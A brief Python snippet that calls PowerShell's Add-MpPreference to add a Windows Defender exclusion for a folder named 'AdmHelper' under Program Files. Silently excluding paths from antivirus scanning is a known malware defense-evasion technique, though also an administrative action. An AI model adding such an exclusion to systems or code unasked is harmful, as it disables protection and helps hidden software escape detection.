import subprocess

def add_exception():
    program_folder ='''
    Add-MpPreference -ExclusionPath 'C:\\Program Files\\AdmHelper\\AdmHelper'
    '''
    subprocess.run(['powershell', f'{program_folder}'])